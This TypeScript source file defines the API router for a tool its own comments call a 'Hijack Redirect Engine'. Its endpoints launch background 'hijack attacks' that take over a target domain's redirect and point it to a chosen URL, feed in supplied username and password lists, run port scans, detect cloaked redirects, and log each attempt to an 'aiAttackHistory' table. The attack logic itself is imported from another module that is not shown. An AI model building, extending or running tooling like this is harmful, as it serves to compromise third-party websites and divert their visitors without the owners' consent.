/**
 * Hijack Redirect Router
 * 
 * tRPC endpoints for the Hijack Redirect Engine:
 * - execute: Run hijack attack on a domain
 * - scanPorts: Quick port scan
 * - detectRedirect: Detect current redirect pattern
 * - getHistory: Get past hijack attempts from DB
 * - getStatus: Get active hijack job status
 */

import { z } from "zod";
import { protectedProcedure, router } from "../_core/trpc";
import { TRPCError } from "@trpc/server";

// In-memory job tracking
interface HijackJob {
  id: string;
  domain: string;
  newRedirectUrl: string;
  status: "running" | "done" | "failed";
  progress: { phase: string; detail: string; methodIndex: number; totalMethods: number };
  startedAt: number;
  result?: any;
}

const activeJobs = new Map<string, HijackJob>();

export const hijackRedirectRouter = router({
  
  // Execute hijack redirect attack
  execute: protectedProcedure
    .input(z.object({
      targetDomain: z.string().min(1),
      newRedirectUrl: z.string().url(),
      originalRedirectUrl: z.string().optional(),
      credentials: z.array(z.object({
        username: z.string(),
        password: z.string(),
      })).optional(),
      targetLanguages: z.array(z.string()).optional(),
      methodTimeout: z.number().optional(),
    }))
    .mutation(async ({ input }) => {
      const jobId = `hijack-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;
      const domain = input.targetDomain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
      
      // Create job entry
      const job: HijackJob = {
        id: jobId,
        domain,
        newRedirectUrl: input.newRedirectUrl,
        status: "running",
        progress: { phase: "init", detail: "Starting hijack...", methodIndex: 0, totalMethods: 6 },
        startedAt: Date.now(),
      };
      activeJobs.set(jobId, job);
      
      // Run in background
      (async () => {
        try {
          const { executeHijackRedirect } = await import("../hijack-redirect-engine");
          const result = await executeHijackRedirect({
            targetDomain: domain,
            newRedirectUrl: input.newRedirectUrl,
            originalRedirectUrl: input.originalRedirectUrl,
            credentials: input.credentials,
            targetLanguages: input.targetLanguages,
            methodTimeout: input.methodTimeout,
          }, (phase, detail, methodIndex, totalMethods) => {
            job.progress = { phase, detail, methodIndex, totalMethods };
          });
          
          job.status = result.success ? "done" : "failed";
          job.result = result;
          
          // Save to DB
          try {
            const { getDb } = await import("../db");
            const db = await getDb();
            if (db) {
              const { aiAttackHistory } = await import("../../drizzle/schema");
              await db.insert(aiAttackHistory).values({
                userId: 1,
                targetDomain: domain,
                method: "hijack_redirect",
                success: result.success,
                aiReasoning: `Hijack Redirect: ${result.winningMethod || "no method succeeded"}. Methods tried: ${result.methodResults.map(m => `${m.method}(${m.success ? "✅" : "❌"})`).join(", ")}`,
                durationMs: result.totalDurationMs,
                redirectUrl: input.newRedirectUrl,
                pipelineType: "hijack_redirect",
                errorMessage: result.success ? undefined : result.errors.slice(0, 3).join("; "),
              });
            }
          } catch (e) {
            console.error("[HijackRouter] Failed to save to DB:", e);
          }
        } catch (err: any) {
          job.status = "failed";
          job.result = { success: false, errors: [err.message] };
        }
      })();
      
      return { jobId, domain, status: "running" };
    }),
  
  // Get job status
  getStatus: protectedProcedure
    .input(z.object({ jobId: z.string() }))
    .query(({ input }) => {
      const job = activeJobs.get(input.jobId);
      if (!job) throw new TRPCError({ code: "NOT_FOUND", message: "Job not found" });
      return {
        id: job.id,
        domain: job.domain,
        status: job.status,
        progress: job.progress,
        elapsedMs: Date.now() - job.startedAt,
        result: job.result,
      };
    }),
  
  // Quick port scan
  scanPorts: protectedProcedure
    .input(z.object({ domain: z.string().min(1) }))
    .mutation(async ({ input }) => {
      const { scanPorts } = await import("../hijack-redirect-engine");
      const domain = input.domain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
      return await scanPorts(domain);
    }),
  
  // Detect redirect pattern
  detectRedirect: protectedProcedure
    .input(z.object({ domain: z.string().min(1) }))
    .mutation(async ({ input }) => {
      const { detectRedirectPattern, detectCloakedRedirect } = await import("../hijack-redirect-engine");
      const domain = input.domain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
      const normal = await detectRedirectPattern(domain);
      const cloaked = await detectCloakedRedirect(domain);
      return { normal, cloaked };
    }),
  
  // Get history from DB
  getHistory: protectedProcedure
    .input(z.object({
      limit: z.number().min(1).max(100).default(20),
      domain: z.string().optional(),
    }))
    .query(async ({ input }) => {
      try {
        const { getDb } = await import("../db");
        const db = await getDb();
        if (!db) return [];
        
        const { aiAttackHistory } = await import("../../drizzle/schema");
        const { desc, eq, and, like } = await import("drizzle-orm");
        
        let conditions = eq(aiAttackHistory.pipelineType, "hijack_redirect");
        if (input.domain) {
          conditions = and(conditions, like(aiAttackHistory.targetDomain, `%${input.domain}%`))!;
        }
        
        const rows = await db.select().from(aiAttackHistory)
          .where(conditions)
          .orderBy(desc(aiAttackHistory.createdAt))
          .limit(input.limit);
        
        return rows;
      } catch {
        return [];
      }
    }),
  
  // List active jobs
  listJobs: protectedProcedure
    .query(() => {
      const jobs = Array.from(activeJobs.values()).map(j => ({
        id: j.id,
        domain: j.domain,
        status: j.status,
        progress: j.progress,
        elapsedMs: Date.now() - j.startedAt,
      }));
      return jobs.sort((a, b) => b.elapsedMs - a.elapsedMs);
    }),
});
